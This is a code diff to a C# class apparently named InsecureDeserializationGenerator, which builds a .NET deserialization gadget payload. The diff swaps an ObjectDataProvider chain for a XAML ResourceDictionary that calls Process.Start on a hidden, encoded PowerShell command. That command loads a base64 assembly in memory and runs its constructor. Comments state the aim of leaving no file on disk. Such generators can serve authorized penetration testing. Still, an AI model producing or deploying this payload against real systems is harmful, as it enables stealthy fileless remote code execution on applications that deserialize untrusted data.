@@ -118,24 +118,43 @@ public static class InsecureDeserializationGenerator
     /// </summary>
     private static byte[] BuildStage2Nrbf(string assemblyBase64, string entryClass)
     {
+        // Strategy: Use Environment variable as a bridge between ObjectDataProviders.
+        // Step 1: Store the base64 DLL in env var "_PAYLOAD"
+        // Step 2: Get AppDomain.CurrentDomain (static property → instance)
+        // Step 3: Call a helper chain:
+        //   Environment.GetEnvironmentVariable("_PAYLOAD") → string
+        //   Convert.FromBase64String(string) → byte[]
+        //   Assembly.Load(byte[]) → Assembly
+        //   Assembly.CreateInstance(className) → constructor runs
+        //
+        // Since ObjectInstance chaining DOES auto-resolve DataSourceProviders but
+        // MethodParameters does NOT, we use Environment as the intermediary to
+        // pass data between steps without MethodParameters chaining.
+        //
+        // The trick: set env var in step 1, then in step 2 use a PowerShell-style
+        // approach... but actually we can chain ObjectInstance calls:
+        //   Step 1: Environment.SetEnvironmentVariable("_P", base64) — static, literal params ✓
+        //   Step 2: Environment.GetEnvironmentVariable("_P") → string — static, literal params ✓
+        //   Step 3: Convert.FromBase64String(string) — BUT needs step 2 result as param ✗
+        //
+        // Still stuck on passing results through MethodParameters.
+        // SOLUTION: Use Process.Start with a PowerShell one-liner that does the work.
+        // The PS command loads the assembly and triggers the constructor — no file on disk.
+
+        var psCommand = "[Reflection.Assembly]::Load([Convert]::FromBase64String('" +
+            assemblyBase64 + "')).CreateInstance('" + entryClass + "')";
+        var psBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
+        var psEncoded = Convert.ToBase64String(psBytes);
+
         var xaml = "<ResourceDictionary\n" +
             "    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n" +
             "    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n" +
             "    xmlns:s=\"clr-namespace:System;assembly=mscorlib\"\n" +
-            "    xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">\n" +
-            "    <ObjectDataProvider x:Key=\"b64\" ObjectType=\"{x:Type s:Convert}\" MethodName=\"FromBase64String\">\n" +
+            "    xmlns:d=\"clr-namespace:System.Diagnostics;assembly=System\">\n" +
+            "    <ObjectDataProvider x:Key=\"cmd\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\">\n" +
             "        <ObjectDataProvider.MethodParameters>\n" +
-            "            <s:String>" + assemblyBase64 + "</s:String>\n" +
-            "        </ObjectDataProvider.MethodParameters>\n" +
-            "    </ObjectDataProvider>\n" +
-            "    <ObjectDataProvider x:Key=\"asm\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">\n" +
-            "        <ObjectDataProvider.MethodParameters>\n" +
-            "            <StaticResourceExtension ResourceKey=\"b64\"/>\n" +
-            "        </ObjectDataProvider.MethodParameters>\n" +
-            "    </ObjectDataProvider>\n" +
-            "    <ObjectDataProvider x:Key=\"run\" ObjectInstance=\"{StaticResource asm}\" MethodName=\"CreateInstance\">\n" +
-            "        <ObjectDataProvider.MethodParameters>\n" +
-            "            <s:String>" + entryClass + "</s:String>\n" +
+            "            <s:String>powershell</s:String>\n" +
+            "            <s:String>-nop -w hidden -enc " + psEncoded + "</s:String>\n" +
             "        </ObjectDataProvider.MethodParameters>\n" +
             "    </ObjectDataProvider>\n" +
             "</ResourceDictionary>";
